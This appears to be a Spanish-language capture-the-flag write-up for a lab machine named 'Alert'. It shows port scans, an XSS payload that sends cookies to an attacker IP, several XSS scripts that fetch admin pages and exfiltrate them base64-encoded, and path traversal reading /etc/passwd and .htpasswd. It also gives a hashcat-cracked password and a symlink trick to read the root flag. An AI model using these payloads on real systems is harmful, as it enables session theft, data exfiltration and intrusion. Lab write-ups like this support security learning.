@@ -1,0 +1,228 @@
+<!DOCTYPE html>
+<!-- saved from url=(0050)https://secret.club/2022/05/11/fuzzing-solana.html -->
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="theme-color" content="#111111"><meta property="og:image" content="/assets/twitter.png"><link rel="preload" href="./fonts.min.css" as="style"><link rel="stylesheet" href="./fonts.min.css"><link rel="alternate" type="application/atom+xml" title="juanchan.es RSS" href="https://juanchan.es">
+
+    <title>Máquina 1</title>
+
+
+    <meta name="generator" content="Jekyll v3.9.3"><meta property="og:title" content="maquinas/ctf"><meta name="author" content="addison"><meta property="og:locale" content="en_US"><meta name="description" content="maquinas/ctf juanchan.es"><meta property="og:description" content="maquinas/ctf juanchan.es"><link rel="canonical" href="https://juachan.es"><meta property="og:url" content="https://juachan.es"><meta property="og:site_name" content="juanchan"><meta property="og:type" content="article"><meta property="article:published_time" content="2022-05-11T07:00:00+00:00"><script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"addison"},"dateModified":"2022-05-11T07:00:00+00:00","datePublished":"2022-05-11T07:00:00+00:00","description":"maquinas/ctf juanchan.es","headline":"maquinas/ctf juanchan","mainEntityOfPage":{"@type":"WebPage","@id":"https://juanchan.es"},"url":"https://juanchan.es"}</script><style> * { margin: 0; padding: 0; box-sizing: border-box; color: inherit; text-decoration: inherit; } html { background: var(--bg-0); color: var(--text-0); width: 100%; text-rendering: optimizeLegibility; font-feature-settings: "kern" 1; font-feature-settings: "liga" 1; min-width: 100vw; overflow-x: hidden; -webkit-text-size-adjust: 100%; } @media all and (min-width:640px) { html{ font-size: 16.5px; } } @media all and (min-width:720px) { html{ font-size: 17px; } } @media all and (min-width:960px) { html{ font-size: 18px; } } body { max-width: 944px; margin: 0 auto; padding: 0 24px; font-family: "Charter", serif; } header, h1, h2, h3, .sans { font-family: 'Space Grotesk', Helvetica, sans-serif; } code, .mono, summary { font-family: 'Source Code Pro', monospace; font-weight: 500; } .img-right { float: right; height: 300px; padding-left: 2em } body > header { display: flex; justify-content: space-between; align-items: center; margin: 2em 0; } nav a { margin-left: 1.5em; letter-spacing: 0.07em; font-size: .9rem; } :root { --text-0: rgba(255, 255, 255, 87%); --text-1: rgba(255, 255, 255, 60%); --bg-0: #121212; --bg-1: rgba(255, 255, 255, 5%); --bg-2: rgba(255, 255, 255, 12%); --accent: #ef5350; --keyword: #b794f6; --string: #89a2f6; --literal: #f88478; --type: #f8819c; } @media (prefers-color-scheme: light) { :root { --text-0: rgba(0, 0, 0, 87%); --text-1: rgba(0, 0, 0, 66%); --bg-0: #fff; --bg-1: #f2f2f2; --bg-2: rgba(0, 0, 0, 12%); --keyword: #7c4dff; --string: #586ada; --literal: #d14641; --type: #bd00f8; } } .tags, .pagination > :nth-child(2) { margin-bottom: 2rem; } .tags, .pagination .mono { color: var(--text-1); font-size: 0.8rem; } .tags > a, .pagination .mono { color: var(--accent); } .pagination { display: flex; justify-content: space-between; flex-wrap: wrap-reverse; } .pagination > a { font-size: 0.9rem; display: inline-block; } .pagination .mono { letter-spacing: 0.07em; } article > :not(main) { font-size: 16px; } article > h1 { font-size: 2rem; margin-bottom: 12px; } .authors { position: absolute; margin-top: 4px; color: var(--text-1); } .authors > a { color: var(--text-0); } article > div > img { display: inline; object-fit: cover; height: 48px; width: 48px; border-radius: 100%; margin-right: 8px; background: var(--bg-1); } article > time { color: var(--text-1); position: absolute; margin: -24px 0 0 56px; } article > hr { width: 128px; border: 2.5px solid var(--bg-1); margin-top: 12px; } main { margin: 2rem 0; } main > :nth-last-child(2) { margin-bottom: 2rem; } main img, main video, main iframe, main object { max-width: 100%; height: auto; display: flex; margin: auto; } main iframe { width: 100%; height: 504px; } p, ul, ol { line-height: 1.35; margin-bottom: 1rem; } details + :not(details) { margin-top: 1rem; } details + h3, details + h2, details + h1 { margin-top: 1.2rem; } object { margin-bottom: 1rem; } h1, h2, h3 { position: relative; margin: 1.2rem 0 0.2rem 0; } h3, h2 { line-height: 24px; } main h1:before, h2:before, h3:before { content: "#"; color: var(--accent); font-weight: bold; float: left; margin-left: -19px; position: absolute; } h3:before { content: ""; margin-left: -17px; height: 10px; width: 10px; background: var(--accent); border-radius: 100%; top: calc(50% - 6px); } h1 { font-size: 1.3em; } h2 { font-size: 1.2em; } h3 { font-size: 1.1em; } p a, main li a { text-decoration: underline; } summary { margin-left: -17px; cursor: pointer; } summary::marker { color: var(--accent); } details :nth-child(2) { margin-top: 0.8rem; } ul { list-style: none; } ul li, ol li { padding-left: 1rem; margin: 0 0 0.2rem 1rem; } ul li::before { content: "•"; float: left; margin-left: -2rem; transform: scale(1.4); } blockquote { color: var(--text-1); font-style: italic; margin: 0 2em; } .footnotes { border-top: 1px solid var(--bg-1); padding-top: 1rem; } pre { border-left: 4px solid var(--bg-1); margin: 0 0 1rem -24px; padding-left: 20px; overflow-x: scroll; scrollbar-width: none; -ms-overflow-style: none; } pre::-webkit-scrollbar { width: 0; height: 0; } :not(pre) > code { background: var(--bg-1); padding: 2px 4px; } pre > code { display: inline-block; } code { font-size: 14px; } @media screen and (min-width: 640px) { code { font-size: 15px; } } @media screen and (max-width: 944px) { main iframe { height: calc((100vw - 24px) * 0.5625); } blockquote { margin: 0 0 0 1.25em; } ul li::before { margin-left: -1.25rem; } ul li { padding-left: 0.625rem; margin-left: 0.625rem; } ol li { padding-left: 0.25rem; } } .aside { color: var(--text-1); } @media screen and (min-width: 1074px) { article::before { background: radial-gradient( circle at center, var(--bg-1) 25%, transparent 25% ), transparent; background-size: 10px 10px; content: ""; display: block; height: 300px; width: 300px; position: absolute; transform: translate(-72px, -72px); z-index: -1; } article { padding: 24px 0 0 24px; margin: -24px 0 0 -24px; background: var(--bg-0); } article h1:first-of-type { margin-top: 0; } body > header { margin-bottom: 5em; } } @media screen and (max-width: 1584px) { .aside { position: relative; padding: 4px 0 4px 0; border-bottom: 1.5px solid var(--bg-1); border-top: 1.5px solid var(--bg-1); } } @media screen and (min-width: 1584px) { .aside { float: left; position: absolute; left: 0; transform: translate(calc(-100% - 28px), calc(-100% - 1rem)); width: 320px; text-align: right; clear: both; } footer { position: absolute; left: calc(100% + 24px); width: 320px; top: 0; } } code .gu, code .gh { font-weight: bold; } code .p { color: var(--text-1); } code .c, code .ch, code .cm, code .cp, code .cpf, code .c1, code .cs { color: var(--text-1); } code .o, code .ow { color: var(--keyword); } code .k, code .kn, code .kc, code .kp, code .kr, code .nt, code b { color: var(--keyword); font-weight: bold; } code .kt, code .kd, code .nb, code .nl, code .nv, code .vc, code .vg, code .vi, code .vm, code .gd { color: var(--type); } code .m, code .mb, code .mf, code .mh, code .mi, code .mo, code .il, code .se { color: var(--literal); } code .s, code .sa, code .sb, code .sc, code .dl, code .sd, code .s2, code .sh, code .si, code .sx, code .sr, code .s1, code .ss, code .gi { color: var(--string); }</style>
+    </head>
+
+
+<body><header align="center"><a href="/maquinas.html">Máquinas/CTF</a><nav><a href="/">Sobre mi</a></nav></header>
+
+
+    <article aria-label="Content" itemscope="" itemtype="http://schema.org/BlogPosting"><h1 itemprop="name headline">Máquina resuelta</h1><div itemprop="author" itemscope="" itemtype="http://schema.org/Person" style="height:48px"> <img itemprop="image" alt="main authors image" src="./agile.jpg"> <span class="mono authors"> <a href="https://secret.club/author/addison" itemprop="name">Agile</a> </span></div><time datetime="2022-05-11T07:00:00+00:00" itemprop="datePublished" class="mono"> Feb, 2023 </time><hr><main itemprop="articleBody" style="position: relative">
+
+
+<h2 id="1-escaneo-de-puertos-tcp">1. Escaneo de puertos tcp</h2>
+<pre><code class="language-bash">PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 7e:46:2c:46:6e:e6:d1:eb:2d:9d:34:25:e6:36:14:a7 (RSA)
+|   256 45:7b:20:95:ec:17:c5:b4:d8:86:50:81:e0:8c:e8:b8 (ECDSA)
+|_  256 cb:92:ad:6b:fc:c8:8e:5e:9f:8c:a2:69:1b:6d:d0:f7 (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Did not follow redirect to http://alert.htb/
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre>
+<p>&nbsp;</p>
+<h2 id="2-enumeración">2. Enumeración</h2>
+<p>Lanzamos la herramienta <strong>gobuster</strong> para realizar un directory listing:</p>
+<pre><code class="language-bash"># gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://alert.htb/ -t 200
+</code></pre>
+<p>Y obtenemos la siguiente salida:</p>
+<pre><code class="language-bash">/css                  (Status: 301) [Size: 304] [--&gt; http://alert.htb/css/]
+/messages             (Status: 301) [Size: 309] [--&gt; http://alert.htb/messages/]
+/uploads              (Status: 301) [Size: 308] [--&gt; http://alert.htb/uploads/]
+</code></pre>
+<p>Si nos dirigimos al endpoint <code>/uploads</code>, podemos observar una pagina web en la que se pueden subir archivos .md. Vemos que es vulnerable a XSS, por ejemplo subien el archivo .md con el siguiente contenido <code>&lt;script&gt;alert(&#39;xss&#39;);&lt;/script&gt;</code> se ejecuta dicho código al visualizar dicho archivo.</p>
+<h2 id="3-explotacion">3. Explotacion</h2>
+<p>En la sección de &quot;About Us&quot; vemos el siguiente mensaje:</p>
+<pre><code class="language-bash">&quot;Our administrator is in charge of reviewing contact messages and reporting errors to us, so we strive to resolve all issues within 24 hours.&quot;
+</code></pre>
+<p>Entonces podemos entender que si subimos un archivo .md y le pasamos el enlace de dicho archivo, el adminsitrador del sistema lo revisará y abrirá dicho archivo, ejecutando el código y pudiendo inyectar código en su propio navegador.</p>
+<p>Empezamos intentando obtener la cookie de sesion del administrador, ejecutando lo siguiente:</p>
+<pre><code class="language-bash"># python -m server.http 80
+</code></pre>
+<p>Y el siguiente contenido en el .md: </p>
+<pre><code class="language-bash">&lt;script&gt;document.location=&#39;http://10.10.14.49?c=&#39;+document.cookie&lt;/script&gt;
+</code></pre>
+<p>Pero observamos como no somos capaces de ver ningún contenido. Podemos probar a obtener el contenido de la pagina que está viendo el propio usuario administrador, es decir el endpoint <code>/messages</code>. Para ello establecemos el siguiente contenido en el .md:</p>
+<pre><code class="language-bash">&lt;script&gt;
+var url = &quot;http://alert.htb/index.php?page=messages&quot;
+var attacker = &quot;http://10.10.14.49:80/exfil&quot;
+var xhr = new XMLHttpRequest()
+xhr.onreadystatechange = function () {
+if (xhr.readyState == XMLHttpRequest.DONE) {
+fetch(attacker + &quot;?&quot; + encodeURI(btoa(xhr.responseText)))
+}
+}
+xhr.open(&quot;GET&quot;, url, true)
+xhr.send(null)
+&lt;/script&gt;
+</code></pre>
+<p>Y vemos como obtenemos la siguiente respuesta en nuestro servidor web:</p>
+<pre><code class="language-bash">Alert - Markdown Viewer
+Markdown Viewer
+Contact Us
+About Us
+Donate
+Messages    
+Messages2024-03-10_15-48-34.txt
+© 2024 Alert. All rights reserved.
+</code></pre>
+<p>Utilizando los directorios que descubrimos con gobuster, intentamos obtener el contenido de dicho archivo. Por lo que establecemos el siguiente contenido en el .md:</p>
+<pre><code class="language-bash">&lt;script&gt;
+var url = &quot;http://alert.htb/messages.php?file=2024-03-10_15-48-34.txt&quot;
+var attacker = &quot;http://10.10.14.49:80/exfil&quot;
+var xhr = new XMLHttpRequest()
+xhr.onreadystatechange = function () {
+if (xhr.readyState == XMLHttpRequest.DONE) {
+fetch(attacker + &quot;?&quot; + encodeURI(btoa(xhr.responseText)))
+}
+}
+xhr.open(&quot;GET&quot;, url, true)
+xhr.send(null)
+&lt;/script&gt;
+</code></pre>
+<p>Pero vemos que de nuevo no obtenemos nada. Intentamos entonces un path traversal en dicho endpoint, estableciendo el siguiente contenido en el archivo .md:</p>
+<pre><code class="language-bash">&lt;script&gt;
+var url = &quot;http://alert.htb/messages.php?file=../../../../../../../etc/passwd&quot;
+var attacker = &quot;http://10.10.14.49:80/exfil&quot;
+var xhr = new XMLHttpRequest()
+xhr.onreadystatechange = function () {
+if (xhr.readyState == XMLHttpRequest.DONE) {
+fetch(attacker + &quot;?&quot; + encodeURI(btoa(xhr.responseText)))
+}
+}
+xhr.open(&quot;GET&quot;, url, true)
+xhr.send(null)
+&lt;/script&gt;
+</code></pre>
+<p>Y vemos que es vulnerable, obteniendo la siguiente respuesta:</p>
+<pre><code class="language-bash">root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
+syslog:x:104:110::/home/syslog:/usr/sbin/nologin
+_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
+uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
+landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:110:1::/var/cache/pollinate:/bin/false
+fwupd-refresh:x:111:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
+usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+albert:x:1000:1000:albert:/home/albert:/bin/bash
+lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
+david:x:1001:1002:,,,:/home/david:/bin/bash
+</code></pre>
+<p>Podemos probar a obtener la configuracion del apache en busca de otros servicios web. Para ello establecemos el siguiente contenido en el archivo .md:</p>
+<pre><code class="language-bash">&lt;script&gt;
+var url = &quot;http://alert.htb/messages.php?file=../../../../../../../etc/apache2/sites-enabled/000-default.conf&quot;
+var attacker = &quot;http://10.10.14.49:80/exfil&quot;
+var xhr = new XMLHttpRequest()
+xhr.onreadystatechange = function () {
+if (xhr.readyState == XMLHttpRequest.DONE) {
+fetch(attacker + &quot;?&quot; + encodeURI(btoa(xhr.responseText)))
+}
+}
+xhr.open(&quot;GET&quot;, url, true)
+xhr.send(null)
+&lt;/script&gt;
+</code></pre>
+<p>Obtenemos la siguiente respuesta y vemos que hay otro dominio DNS:</p>
+<pre><code class="language-bash">&lt;VirtualHost *:80&gt;
+ServerName statistics.alert.htb
+
+DocumentRoot /var/www/statistics.alert.htb
+
+&lt;Directory /var/www/statistics.alert.htb&gt;
+    Options FollowSymLinks MultiViews
+    AllowOverride All
+&lt;/Directory&gt;
+
+&lt;Directory /var/www/statistics.alert.htb&gt;
+    Options Indexes FollowSymLinks MultiViews
+    AllowOverride All
+    AuthType Basic
+    AuthName &quot;Restricted Area&quot;
+    AuthUserFile /var/www/statistics.alert.htb/.htpasswd
+    Require valid-user
+&lt;/Directory&gt;
+
+ErrorLog ${APACHE_LOG_DIR}/error.log
+CustomLog ${APACHE_LOG_DIR}/access.log combined
+&lt;/VirtualHost&gt;
+</code></pre>
+<p>Si accedemos al archivo que se encuentra en el endpoint <code>/var/www/statistics.alert.htb/.htpasswd</code> vemos el siguiente contenido:</p>
+<pre><code class="language-bash">albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/
+</code></pre>
+<p>Lo que se trata de un hash APR1-MD5. Lo intentamos bruteforcear con hashcat:</p>
+<pre><code class="language-bash"># hashcat -m 1600 hashes /usr/share/wordlists/rockyou.txt
+</code></pre>
+<p>Y obtenemos la siguientes credenciales:</p>
+<pre><code class="language-bash">$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/:manchesterunited
+</code></pre>
+<p>Probamos a acceder con ssh utilizando dichas credenciales y obvervamos como tenemos acceso. Por lo que somos capaces de obtener la flag de usuario.</p>
+<p>&nbsp;</p>
+<h2 id="3-escalado-de-privilegios">3. Escalado de privilegios</h2>
+<p>Si listamos las interfaces de red de la maquina vemos lo siguiente:</p>
+<pre><code class="language-bash">
+$ netstat -lntu
+Proto Recv-Q Send-Q Local Address           Foreign Address         State      
+tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN     
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN     
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
+tcp6       0      0 :::80                   :::*                    LISTEN     
+tcp6       0      0 :::22                   :::*                    LISTEN     
+udp        0      0 127.0.0.53:53           0.0.0.0:*                          
+udp        0      0 0.0.0.0:68              0.0.0.0:* 
+</code></pre>
+<p>Vemos que en el puerto 8080 existe los que parece un servicio web. Por lo que forardeamos a nuestra máquina para obtener así un acceso a el:</p>
+<pre><code class="language-bash"># ssh -L 1234:127.0.0.1:8080 albert@alert.htb
+</code></pre>
+<p>Si accedemos a dicho servicio podemos ver un servicio llamado <strong>website-monitor</strong>. Buscando en internet pode descubrir el repositorio oficial en el siguiente enlace <a href="https://neatnik.net/dispenser/?project=website-monitor">https://neatnik.net/dispenser/?project=website-monitor</a>.</p>
+<p>En la máquina objetivo podemos ver la carpeta local en la que se guardan todos sus archivos:</p>
+<pre><code class="language-bash"># cd /opt/website-monitor
+</code></pre>
+<p>Vemos que en la carpeta /monitors se están actualizando datos constantemente, y que tienen permisos de root. También podemos ver, que podemos listar dichos archivos en el navegador mediante el siguiente endpoint <code>http://127.0.0.1:8080/monitors/statistics.alert.htb</code>.</p>
+<p>Por lo que podemos crear un enlace simbólico que apunte al archivo <code>/root/root.txt</code> y ver la flag del usuario root:</p>
+<pre><code class="language-bash"># ln -s /root/root.txt root.txt
+</code></pre>
+<p>Si accedemos al endpoit <code>http://127.0.0.1:8080/monitors/statistics.alert.htb/root.txt</code> podemos obervar la flag del usuario root.</p>
+
+        
+
+
+
+
+<p>&nbsp;</p><p>&nbsp;</p>
+</div>
+     <div class="footer-credits" style="display: flex; justify-content: flex-end">
+        <a> Made by Juan González </a>
+    </div>
+</div>
+</body></html>
